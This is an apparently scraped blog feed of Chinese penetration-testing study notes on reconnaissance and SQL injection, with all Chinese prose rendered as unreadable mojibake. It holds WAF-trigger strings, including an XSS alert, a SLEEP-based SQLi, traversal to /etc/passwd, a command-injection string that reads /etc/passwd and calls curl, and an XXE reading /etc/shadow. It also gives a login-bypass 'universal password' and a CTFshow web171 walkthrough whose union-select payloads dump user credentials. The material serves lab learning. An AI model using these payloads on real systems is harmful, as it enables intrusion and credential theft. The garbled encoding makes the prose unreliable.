&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F; I wc -1</p><p>å…¨éƒ¨æ¸…å•ï¼š<a href="https://nmap.org/book/nse.html">Nmap Scripting Engine</a></p><p>ä¾‹å¦‚ï¼š</p><p>nmap 192.168.142.137 â€“script http-enum åˆ—ä¸¾HTTPæœåŠ¡</p><p>nmapâ€“script&#x3D;authç»•è¿‡é‰´æƒ </p><p>nmapâ€“script&#x3D;brute æš´åŠ›ç ´è§£ nmap â€“script&#x3D;vuln æ‰«ææ¼æ´</p><h4 id="æŒ‡çº¹è¯†åˆ«"><a href="#æŒ‡çº¹è¯†åˆ«" class="headerlink" title="æŒ‡çº¹è¯†åˆ«"></a>æŒ‡çº¹è¯†åˆ«</h4><p><strong>è¯†åˆ«å¯¹è±¡</strong></p><ol><li>CMSä¿¡æ¯ï¼šæ¯”å¦‚Discuzã€ç»‡æ¢¦ã€å¸å›½CMSã€PHPCMSã€ECshopç­‰</li><li>å‰ç«¯æŠ€æœ¯ï¼šæ¯”å¦‚HTML5ã€jqueryã€bootstrapã€Vueã€aceç­‰;</li><li>å¼€å‘è¯­è¨€ï¼šæ¯”å¦‚PHPã€Javaã€Rubyã€Pythonã€C#ç­‰;</li><li>WebæœåŠ¡å™¨ï¼šæ¯”å¦‚Apacheã€ Nginxã€IISã€lighttpdç­‰;</li><li>åº”ç”¨æœåŠ¡å™¨ï¼šæ¯”å¦‚Tomcatã€Jbossã€Weblogicã€Websphereç­‰;</li><li>æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼šæ¯”å¦‚Linuxã€win2k8ã€win7ã€Kaliã€Centosç­‰;</li><li>CDNä¿¡æ¯ï¼šæ˜¯å¦ä½¿ç”¨CDNï¼Œå¦‚cloudflareã€å¸è”ã€è“è®¯ã€ç½‘å®¿ã€ä¸ƒç‰›äº‘ã€é˜¿é‡Œäº‘ç­‰ï¼›</li><li>WAFä¿¡æ¯ï¼šæ˜¯å¦ä½¿ç”¨WAFï¼Œå¦‚Dç›¾ã€äº‘é”ã€å®å¡”ã€å®‰å…¨ç‹—ã€360ç­‰</li></ol><h5 id="CMSæŒ‡çº¹è¯†åˆ«"><a href="#CMSæŒ‡çº¹è¯†åˆ«" class="headerlink" title="CMSæŒ‡çº¹è¯†åˆ«"></a>CMSæŒ‡çº¹è¯†åˆ«</h5><p>å†…å®¹ç®¡ç†ç³»ç»Ÿ</p><p>Content Management System</p><p>é€šè¿‡å…³é”®ç‰¹å¾å™¨ã€å¼€å‘è¯­è¨€ã€ç‰ˆæœ¬ç­‰ç­‰</p><p>è¯†åˆ«å‡ºæœˆæ ‡çš„CMSç³»ç»Ÿã€æœåŠ¡æ“ä½œç³»ç»Ÿã€CDNã€WAFçš„ç±»åˆ«</p><h6 id="å¸¸è§çš„CMS"><a href="#å¸¸è§çš„CMS" class="headerlink" title="å¸¸è§çš„CMS"></a><strong>å¸¸è§çš„CMS</strong></h6><p>åšå®¢ï¼ˆæ¯”å¦‚CSDNã€åšå®¢å›­ï¼‰ã€å¾®åšã€ç«™ã€å¯¼èˆªç½‘ç«™ï¼ˆhao123ï¼‰ã€ä¿¡æ¯åˆ†ç±»ï¼ˆçŸ¥ä¹ï¼‰ã€å•†åŸã€ç™¾ç§‘â€¦ï¼ã€€</p><p>é—®ç­”ç½‘ç«™ã€ä¼ä¸šå®˜ç½‘ã€å­¦æ ¡å®˜ç½‘ã€åŒ»é™¢å®˜ç½‘ã€å›¢è´­ç½‘(58ï¼‰</p><p><img src="CMS.png" loading="lazy"></p><h6 id="å„ç±»ç½‘ç«™å¼€æºCMS"><a href="#å„ç±»ç½‘ç«™å¼€æºCMS" class="headerlink" title="å„ç±»ç½‘ç«™å¼€æºCMS"></a><strong>å„ç±»ç½‘ç«™å¼€æºCMS</strong></h6><ul><li>ä¼ä¸šå»ºç«™ç³»ç»Ÿï¼šMetlnfo(ç±³æ‹“)ã€è‰çŸ¥ã€SiteServer CMSç­‰;</li><li>B2Cå•†åŸç³»ç»Ÿï¼šå•†æ´¾Shopexã€ECshopã€HiShopã€XpShopç­‰</li><li>é—¨æˆ·å»ºç«™ç³»ç»Ÿï¼šDedeCMS(ç»‡æ¢¦)ã€å¸å›½CMSã€PHPCMSã€åŠ¨æ˜“CmsTopç­‰;</li><li>åšå®¢ç³»ç»Ÿï¼šWordPressã€Z-Blogç­‰</li><li>è®ºå›ç¤¾åŒºï¼šDiscuzã€PHPwindã€WeCenterç­‰</li><li>é—®ç­”ç³»ç»Ÿï¼šTipaskã€whatsnsç­‰</li><li>çŸ¥è¯†ç™¾ç§‘ç³»ç»Ÿï¼šHDwiki;</li><li>B2Bé—¨æˆ·ç³»ç»Ÿï¼šDestoonã€B2Bbuilderã€å‹é‚»B2Bç­‰</li><li>äººæ‰æ‹›è˜ç½‘ç«™ç³»ç»Ÿï¼šéª‘å£«CMSã€PHPäº‘äººæ‰ç®¡ç†ç³»ç»Ÿ</li><li>æˆ¿äº§ç½‘ç«™ç³»ç»Ÿï¼šFangCmsç­‰;</li><li>åœ¨çº¿æ•™è‚²å»ºç«™ç³»ç»Ÿï¼šKesionã€EduSoho;</li><li>ç”µå½±ç½‘ç«™ç³»ç»Ÿï¼šè‹¹æœcMSã€ctcmsã€movcmsç­‰</li><li>å°è¯´æ–‡å­¦å»ºç«™ç³»ç»Ÿï¼šæ°å¥‡CMS</li></ul><h6 id="CMSæŒ‡çº¹è¯†åˆ«æ€è·¯"><a href="#CMSæŒ‡çº¹è¯†åˆ«æ€è·¯" class="headerlink" title="CMSæŒ‡çº¹è¯†åˆ«æ€è·¯"></a>CMSæŒ‡çº¹è¯†åˆ«æ€è·¯</h6><p>ç‰ˆæƒä¿¡æ¯ã€ç‰¹å®šæ–‡ä»¶MD5å€¼ã€æŸ¥çœ‹ç½‘é¡µæºä»£ç ã€é€šè¿‡ç‰¹å®šæ–‡ä»¶åˆ†æ</p><h6 id="CMSè¯†åˆ«å·¥å…·"><a href="#CMSè¯†åˆ«å·¥å…·" class="headerlink" title="CMSè¯†åˆ«å·¥å…·"></a>CMSè¯†åˆ«å·¥å…·</h6><ul><li>whatweb(kali)</li><li>æµè§ˆå™¨æ’ä»¶</li><li><ul><li><a href="https://www.wappalyzer.com/">Wappalyzer</a></li><li><a href="https://www.whatruns.com/">whatruns</a></li></ul></li><li>åœ¨çº¿ç½‘ç«™</li><li><ul><li><a href="http://finger.tidesec.com/">æ½®æ±æŒ‡çº¹è¯†åˆ«</a></li></ul></li><li>ç¦»çº¿ç½‘ç«™</li><li><ul><li>å¾¡å‰‘æŒ‡çº¹æ‰«æå™¨(éœ€è¦.NET Frameworkï¼‰</li><li>Test404è½»é‡CMSæŒ‡çº¹è¯†åˆ«v2.1</li><li><a href="https://github.com/Tuhinshubhra/CMSeeK">CMSeek</a></li></ul></li></ul><h5 id="CDNæŒ‡çº¹è¯†åˆ«"><a href="#CDNæŒ‡çº¹è¯†åˆ«" class="headerlink" title="CDNæŒ‡çº¹è¯†åˆ«"></a>CDNæŒ‡çº¹è¯†åˆ«</h5><ul><li>(è¶…çº§)ping</li><li>nslookup</li><li>ldb(load balance detector  Kali)</li><li>å›½å†…ï¼š</li><li><ul><li><a href="http://cdn.chinaz.com/">å„åœ°CDNèŠ‚ç‚¹æµ‹é€Ÿç»“æœ - CDNäº‘è§‚æµ‹ - ç«™é•¿å·¥å…·</a></li></ul></li><li>å›½å¤–ï¼š</li><li><ul><li><a href="https://www.cdnplanet.com/tools/cdnfinder/">CDN Finder</a></li></ul></li><li>è„šæœ¬ï¼š</li><li><ul><li><a href="https://github.com/boy-hack/w8fuckcdn/">w8Fuckcdn</a> </li><li><a href="https://github.com/3xp10it/xcdn">xcdn</a></li></ul></li></ul><h5 id="WAFæŒ‡çº¹è¯†åˆ«"><a href="#WAFæŒ‡çº¹è¯†åˆ«" class="headerlink" title="WAFæŒ‡çº¹è¯†åˆ«"></a>WAFæŒ‡çº¹è¯†åˆ«</h5><p>Web. Application Firewall Web åº”ç”¨é˜²ç«å¢™</p><p>è¿‡æ»¤HTTP&#x2F;HTTPSçš„è¯·æ±‚</p><h6 id="WAFçš„ä½œç”¨"><a href="#WAFçš„ä½œç”¨" class="headerlink" title="WAFçš„ä½œç”¨"></a>WAFçš„ä½œç”¨</h6><ul><li><p>SQL Injection (SQLi)ï¼šé˜»æ­¢SQLæ³¨å…¥</p></li><li><p>Cross Site Scripting (XSS)ï¼šé˜»æ­¢è·¨ç«™è„šæœ¬æ”»å‡»</p></li><li><p>Local File Inclusion (LFI)ï¼š é˜»æ­£æ­¢åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œæ”»å‡»</p></li><li><p>Remote File Inclusione(RFl)ï¼šé˜»æ­¢åˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œæ”»å‡»</p></li><li><p>Remote Code Execution(RCE)ï¼šé˜»æ­£æ­¢åˆ©ç”¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´è¿›è¡Œæ”»å‡» PHP Code Injectiodï¼šé˜»æ­£æ­¢PHPä»£ç æ³¨å…¥</p></li><li><p>HTTP Protocol Violationsï¼šé˜»æ­¢è¿åHTTPåè®®çš„æ¶æ„è®¿é—®</p></li><li><p>HTTPoXyï¼šé˜»æ­¢åˆ©ç”¨è¿œç¨‹ä»£ç†æ„ŸæŸ“æ¼æ´è¿›è¡Œæ”»å‡» Sshllshockï¼šé˜»æ­¢åˆ©ç”¨Shellshockæ¼æ´è¿›è¡Œæ”»å‡»</p></li><li><p>Session Fixationï¼š é˜»æ­¢åˆ©ç”¨Sessionä¼šè¯iDä¸å˜çš„æ¼æ´è¿›è¡Œæ”»å‡» ScannerDetectionï¼šé˜»æ­¢é»‘å®¢æ‰«æç½‘ç«™</p></li><li><p>Metadata&#x2F;ErrorLeakagesï¼šé˜»æ­¢æºä»£ç &#x2F;é”™è¯¯ä¿¡æ¯æ³„éœ² Project Honey Pot Blacklistï¼šèœœç½é¡¹ç›®é»‘åå•</p></li><li><p>GeolP Country Blockingï¼šæ ¹æ®åˆ¤æ–­IPåœ°å€å½’å±åœ°æ¥è¿›è¡ŒIPé˜»æ–­</p></li></ul><h6 id="WAFåˆ†ç±»"><a href="#WAFåˆ†ç±»" class="headerlink" title="WAFåˆ†ç±»"></a>WAFåˆ†ç±»</h6><p>ç¡¬ä»¶å‹WAFå‚å•†å®‰è£…ï¼‰</p><p>äº‘WAFï¼ˆé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€åä¸ºäº‘.. ï¼‰</p><p>è½¯ä»¶å‹ WAFï¼ˆéƒ¨ç½²åœ¨ Apacheã€Nginx ç­‰ HTTPServerä¸­ï¼‰</p><h6 id="å¸¸è§WAFå‚å•†"><a href="#å¸¸è§WAFå‚å•†" class="headerlink" title="å¸¸è§WAFå‚å•†"></a>å¸¸è§WAFå‚å•†</h6><p>å„ç§äº‘ï¼šé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€åä¸ºäº‘ã€ç™¾åº¦äº‘</p><p>å®‰å…¨ç‹—ã€å®å¡”ã€360ã€çŸ¥é“åˆ›å®‡ã€é•¿äº­ã€å®‰æ’ã€</p><h6 id="WAFè¯†åˆ«æ€è·¯"><a href="#WAFè¯†åˆ«æ€è·¯" class="headerlink" title="WAFè¯†åˆ«æ€è·¯"></a>WAFè¯†åˆ«æ€è·¯</h6><ul><li><p>é¢å¤–çš„cookie;</p></li><li><p>ä»»ä½•å“åº”æˆ–è¯·æ±‚çš„é™„åŠ æ ‡å¤´;</p></li><li><p>å“åº”å†…å®¹ï¼ˆå¦‚æœè¢«é˜»æ­¢è¯·æ±‚ï¼‰</p></li><li><p>å“åº”ä»£ç ï¼ˆå¦‚æœè¢«é˜»æ­¢è¯·æ±‚ï¼‰</p></li><li><p>IPåœ°å€ï¼ˆäº‘WAFï¼‰ï¼›</p></li><li><p>JSå®¢æˆ·ç«¯æ¨¡å—ï¼ˆå®¢æˆ·ç«¯WAFï¼‰</p></li></ul><h6 id="WAFè§¦å‘æ‹¦æˆªæ–¹å¼"><a href="#WAFè§¦å‘æ‹¦æˆªæ–¹å¼" class="headerlink" title="WAFè§¦å‘æ‹¦æˆªæ–¹å¼"></a>WAFè§¦å‘æ‹¦æˆªæ–¹å¼</h6><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xsstring <span class="token operator">=</span> '<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">sqlistring &#x3D; &quot;UNION SELECT ALL FROM information schema AND &#39; or SLEEP(5) or &#39;&quot;</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">Ifistring <span class="token operator">=</span> "<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/./<span class="token punctuation">..</span>/etc/passwd</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">rcestring <span class="token operator">=</span> <span class="token string">'/bin/cat /etc/passwd; ping 127.0.0.1; curl google.com'</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">xxestring <span class="token operator">=</span> '<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">ENTITY</span> xxe <span class="token constant">SYSTEM</span> <span class="token string">"file:///etc/shadow"</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>pwn<span class="token operator">></span><span class="token operator">&amp;</span>hack<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>pwn<span class="token operator">></span>"</code></pre><h6 id="WAFè¯†åˆ«å·¥å…·"><a href="#WAFè¯†åˆ«å·¥å…·" class="headerlink" title="WAFè¯†åˆ«å·¥å…·"></a>WAFè¯†åˆ«å·¥å…·</h6><p>Kaliè‡ªå¸¦ï¼š</p><ul><li><p><a href="https://github.com/EnableSecurity/wafwOOf">wafwOOf</a> </p></li><li><p>wafw00f <a href="https://www.12306.cn/">https://www.12306.cn</a></p></li><li><p>nmap <a href="http://www.12306.cn/">www.12306.cn</a> â€“script&#x3D;http-waf-detect.nse</p></li><li><p>sqlmap -u â€œxxx.com?id&#x3D;1â€ â€“identify-waf</p></li></ul><p>å…¶ä»–ï¼š</p><ul><li><a href="https://github.com/Oxlnfection/Awesome-WAF">Build software better, together</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-sqlii</title>
      <link href="/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/"/>
      <url>/2024/07/05/web%E5%85%A5%E9%97%A8-sqli/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><h4 id="SQLæ³¨å…¥åŸç†"><a href="#SQLæ³¨å…¥åŸç†" class="headerlink" title="SQLæ³¨å…¥åŸç†"></a>SQLæ³¨å…¥åŸç†</h4><h5 id="1-SQLæ³¨å…¥æ¦‚å¿µåŠäº§ç”ŸåŸå› ï¼š"><a href="#1-SQLæ³¨å…¥æ¦‚å¿µåŠäº§ç”ŸåŸå› ï¼š" class="headerlink" title="1.SQLæ³¨å…¥æ¦‚å¿µåŠäº§ç”ŸåŸå› ï¼š"></a>1.SQLæ³¨å…¥æ¦‚å¿µåŠäº§ç”ŸåŸå› ï¼š</h5><p>å½“webåº”ç”¨å‘åå°æ•°æ®åº“ä¼ é€’SQLè¯­å¥è¿›è¡Œæ•°æ®åº“æ“ä½œæ—¶ï¼Œå¦‚æœå¯¹ç”¨æˆ·è¾“å…¥çš„å‚æ•°æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤å¤„ç†ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æ„é€ ç‰¹æ®Š</p><p>çš„SQLè¯­å¥ï¼Œç›´æ¥è¾“å…¥æ•°æ®åº“å¼•æ“æ‰§è¡Œï¼Œè·å–æˆ–ä¿®æ”¹æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚</p><h5 id="2-SQLæ³¨å…¥çš„æœ¬è´¨ï¼š"><a href="#2-SQLæ³¨å…¥çš„æœ¬è´¨ï¼š" class="headerlink" title="2.SQLæ³¨å…¥çš„æœ¬è´¨ï¼š"></a>2.SQLæ³¨å…¥çš„æœ¬è´¨ï¼š</h5><p>æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®å½“ä½œä»£ç æ¥æ‰§è¡Œï¼Œè¿èƒŒäº†â€œæ•°æ®ä¸ä»£ç åˆ†ç¦»â€çš„åŸåˆ™</p><h5 id="3-SQLæ³¨å…¥çš„ä¸¤ä¸ªå…³é”®ç‚¹ï¼š"><a href="#3-SQLæ³¨å…¥çš„ä¸¤ä¸ªå…³é”®ç‚¹ï¼š" class="headerlink" title="3.SQLæ³¨å…¥çš„ä¸¤ä¸ªå…³é”®ç‚¹ï¼š"></a>3.SQLæ³¨å…¥çš„ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</h5><p>1.ç”¨æˆ·èƒ½æ§åˆ¶è¾“å…¥çš„å†…å®¹ï¼› </p><p>2.webåº”ç”¨æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹å¸¦å…¥åˆ°æ•°æ®åº“æ‰§è¡Œï¼›</p><h5 id="SQLæ³¨å…¥åŸºç¡€å±å®³ï¼š"><a href="#SQLæ³¨å…¥åŸºç¡€å±å®³ï¼š" class="headerlink" title="SQLæ³¨å…¥åŸºç¡€å±å®³ï¼š"></a>SQLæ³¨å…¥åŸºç¡€å±å®³ï¼š</h5><p>1.ç›—å–ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯;</p><p>2.ç»•è¿‡ç½‘ç«™åå°è®¤è¯ åå°ç™»å½•è¯­å¥ï¼š </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM admin WHERE Username&#x3D;â€˜userâ€™ and Password&#x3D;â€˜passâ€™ ä¸‡èƒ½å¯†ç ï¼šâ€˜or â€™1â€˜ &#x3D; â€™1â€˜ # ;</code></pre><p>3.å€ŸåŠ©SQLæ³¨å…¥æ¼æ´ææƒè·å–ç³»ç»Ÿæƒé™;</p><p>4.è¯»å–æ–‡ä»¶ä¿¡æ¯ã€‚</p><h4 id="MYSQLæ•°æ®åº“æ³¨å…¥-å¸¸ç”¨å‡½æ•°ï¼š"><a href="#MYSQLæ•°æ®åº“æ³¨å…¥-å¸¸ç”¨å‡½æ•°ï¼š" class="headerlink" title="MYSQLæ•°æ®åº“æ³¨å…¥-å¸¸ç”¨å‡½æ•°ï¼š"></a>MYSQLæ•°æ®åº“æ³¨å…¥-å¸¸ç”¨å‡½æ•°ï¼š</h4><p>ï¼ˆ1ï¼‰user() è¿”å›å½“å‰ä½¿ç”¨æ•°æ®åº“çš„ç”¨æˆ·ï¼Œä¹Ÿå°±æ˜¯ç½‘ç«™é…ç½®æ–‡ä»¶ä¸­è¿æ¥æ•°æ®åº“çš„è´¦å· </p><p>ï¼ˆ2ï¼‰version() è¿”å›å½“å‰æ•°æ®åº“çš„ç‰ˆæœ¬ </p><p>ï¼ˆ3ï¼‰database() è¿”å›å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ï¼Œåªæœ‰åœ¨useå‘½ä»¤é€‰æ‹©ä¸€ä¸ªæ•°æ®åº“ä¹‹åï¼Œæ‰èƒ½æŸ¥åˆ° </p><p>ï¼ˆ4ï¼‰group_concat() æŠŠæ•°æ®åº“ä¸­çš„æŸåˆ—æ•°æ®æˆ–æŸå‡ åˆ—æ•°æ®åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸² </p><p>ï¼ˆ5ï¼‰@@datadir æ•°æ®åº“è·¯å¾„ </p><p>ï¼ˆ6ï¼‰@@version_compile_os æ“ä½œç³»ç»Ÿç‰ˆæœ¬</p><h4 id="SQLï¼ˆè”åˆï¼‰æ³¨å…¥æµç¨‹ï¼š"><a href="#SQLï¼ˆè”åˆï¼‰æ³¨å…¥æµç¨‹ï¼š" class="headerlink" title="SQLï¼ˆè”åˆï¼‰æ³¨å…¥æµç¨‹ï¼š"></a>SQLï¼ˆè”åˆï¼‰æ³¨å…¥æµç¨‹ï¼š</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1 and 1&#x3D;1</code></pre><p>1ã€åˆ¤æ–­æœ‰æ— é—­åˆ </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;ç»“æœå’Œç¬¬ä¸€ä¸ªä¸€æ ·è¯´æ˜éœ€è¦é—­åˆï¼Œåä¹‹æ— é—­åˆ æœ‰é—­åˆåˆ™éœ€è¦ç”¨åˆ° --+é—­åˆ</code></pre><p>2ã€çŒœè§£å­—æ®µ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">order by 10 &#x2F;&#x2F;é‡‡ç”¨äºŒåˆ†æ³• </code></pre><p>3ã€åˆ¤æ–­æ•°æ®å›æ˜¾ä½ç½® </p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">-1 union select 1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5.... &#x2F;&#x2F;å‚æ•°ç­‰å·åé¢åŠ -è¡¨ç¤ºä¸æ˜¾ç¤ºå½“å‰æ•°æ® </code></pre><p>4ã€è·å–å½“å‰æ•°æ®åº“åã€ç”¨æˆ·ã€ç‰ˆæœ¬ union select version(),database()ï¼Œuser()ï¼Œ4â€¦â€¦ 4ã€è·å–å…¨éƒ¨æ•°æ®åº“å</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(schema_name)from information_schema.schemata)</code></pre><p>5ã€è·å–è¡¨å</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;åº“å&#39;</code></pre><p>6ã€è·å–å­—æ®µå</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;è¡¨å&#39;</code></pre><p>7ã€è·å–æ•°æ®</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">union select 1,2,(select group_concat(å­—æ®µ1ï¼Œå­—æ®µ2)from åº“å.è¡¨å</code></pre><p>å‡½æ•°åç§°ï¼š å‡½æ•°åŠŸèƒ½ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">æŸ¥ åº“ï¼š select schema_name from information_schema.schemaæŸ¥ è¡¨ï¼š select table_name from information_schema.tables where table_schema&#x3D;åº“åæŸ¥ åˆ—ï¼š select column_name from information_schema.columns where table_name&#x3D;è¡¨åæŸ¥æ•°æ®ï¼š select åˆ—å from åº“å.è¡¨å</code></pre><blockquote><p><a href="https://blog.csdn.net/fly_enum/article/details/135307756">SQLæ³¨å…¥åŸç†åŠæ€è·¯ç»•è¿‡</a></p></blockquote><p>ä¸‡èƒ½å¯†ç ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39; or 1&#x3D;1--+</code></pre><h4 id="mysqlæ“ä½œç¬¦ä¼˜å…ˆçº§ï¼šï¼ˆæ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰"><a href="#mysqlæ“ä½œç¬¦ä¼˜å…ˆçº§ï¼šï¼ˆæ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰" class="headerlink" title="mysqlæ“ä½œç¬¦ä¼˜å…ˆçº§ï¼šï¼ˆæ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰"></a>mysqlæ“ä½œç¬¦ä¼˜å…ˆçº§ï¼šï¼ˆæ•°å­—è¶Šå¤§ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼‰</h4><p>ä¼˜å…ˆçº§è¿ç®—ç¬¦<br>1:&#x3D;<br>2|| , OR , XOR<br>3&amp;&amp; , AND<br>4NOT<br>5BETWEEN, CASE, WHEN, THEN, ELSE<br>6&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN<br>7|<br>8&amp;<br>9&lt;&lt;, &gt;&gt;<br>10-, +<br>11*, &#x2F;, DIV, %, MOD<br>12^<br>13- (ä¸€å…ƒå‡å·), ~ (ä¸€å…ƒæ¯”ç‰¹åè½¬)<br>14!<br>15BINARY, COLLATE</p><h4 id="æ€»ç»“â€“æ™®é€šSQLæ³¨å…¥å¿…å¤‡æ¡ä»¶ï¼š"><a href="#æ€»ç»“â€“æ™®é€šSQLæ³¨å…¥å¿…å¤‡æ¡ä»¶ï¼š" class="headerlink" title="æ€»ç»“â€“æ™®é€šSQLæ³¨å…¥å¿…å¤‡æ¡ä»¶ï¼š"></a>æ€»ç»“â€“æ™®é€šSQLæ³¨å…¥å¿…å¤‡æ¡ä»¶ï¼š</h4><p>1ã€ç•Œé¢èƒ½å¤Ÿå›æ˜¾æ•°æ®åº“æŸ¥è¯¢åˆ°çš„æ•°æ®ï¼ˆå¿…è¦æ¡ä»¶ï¼‰ï¼›</p><p>2ã€ç•Œé¢å›æ˜¾å†…å®¹è‡³å°‘èƒ½å¤Ÿæ˜¾ç¤ºæ•°æ®åº“ä¸­çš„æŸåˆ—æ•°æ®ï¼ˆå¿…è¦æ¡ä»¶ï¼‰ï¼›</p><p>3ã€éƒ¨åˆ†èƒ½å¤Ÿç›´æ¥æä¾›æ•°æ®åº“æŠ¥é”™å†…å®¹çš„å›æ˜¾ï¼›</p><h3 id="web171-253"><a href="#web171-253" class="headerlink" title="web171-253"></a>web171-253</h3><h4 id="web171-å•å¼•å·é—­åˆ"><a href="#web171-å•å¼•å·é—­åˆ" class="headerlink" title="web171(å•å¼•å·é—­åˆ)"></a>web171(å•å¼•å·é—­åˆ)</h4><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#x2F;&#x2F;æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>æ ¹æ®æµç¨‹æ‹¿åˆ°åº“ è¡¨ åˆ—åï¼Œæœ€åæ‹¿åˆ°flag</p><p>ç¬¬ä¸€é¢˜æ‰€ä»¥æµç¨‹è¯¦ç»†ä¸€ç‚¹</p><p>é¦–å…ˆå°è¯•1â€™â€“+ï¼Œå‘ç°æœ‰è¿”å›å€¼ï¼›è¯´æ˜ç›´æ¥é—­åˆæ­£ç¡®ï¼›</p><p>æ¥ç€æ‰¾ç”¨æ¥è¾“å‡ºçš„åˆ—ï¼š<code>1&#39; order by 3--+</code>ï¼Œå‘ç°ä¸€å…±æœ‰3è¡Œ(å°±1,2,3,4,5æ…¢æ…¢è¯•å‡ºæ¥)</p><p>æŸ¥çœ‹æ•°æ®åº“ï¼š<code>1&#39; union select 1,2,database()--+</code>å¾—åˆ°æ•°æ®åº“åä¸º<code>ctfshow_web</code></p><p>çˆ†ç ´è¡¨åï¼š<code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schecma=database()--+</code>å¾—åˆ°è¡¨åï¼š<code>ctfshow_user</code></p><p>çˆ†ç ´åˆ—åï¼š<code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code>ï¼Œå¾—åˆ°åˆ—åï¼š<code>id,username,password</code></p><p>çˆ†ç ´ä¿¡æ¯ï¼š<code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code>ï¼Œæ‹¿åˆ°flagã€‚</p><p>æ•´ç†ä¸€ä¸‹ï¼š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">çˆ†å‡ºæœ‰å“ªäº›ä½ç½®å¯ä»¥è¿›è¡Œè¾“å‡ºæ•°æ®1&#39; order by 3--+æŸ¥çœ‹æ•°æ®åº“åå­—1&#39; union select 1,2,database()--+çˆ†ç ´è¡¨åï¼š-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema&#x3D;database()--+çˆ†ç ´åˆ—åï¼š1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user&#39;--+çˆ†ç ´æ•°æ®ï¼š1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></pre><p>æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè¿™é‡Œç”¨çš„æ˜¯1è€Œä¸æ˜¯-1ï¼Œå±…ç„¶èƒ½å¤Ÿçˆ†å‡ºä¿¡æ¯ã€‚å¯èƒ½æ˜¯è¿™é‡Œæ²¡æœ‰é™å®šè¾“å‡ºæ•°æ®çš„é‡ï¼Œæ‰€ä»¥èƒ½å¤Ÿç”¨1ï¼Œè€Œä¸æ˜¯ç”¨-1ã€‚</p><h4 id="web172"><a href="#web172" 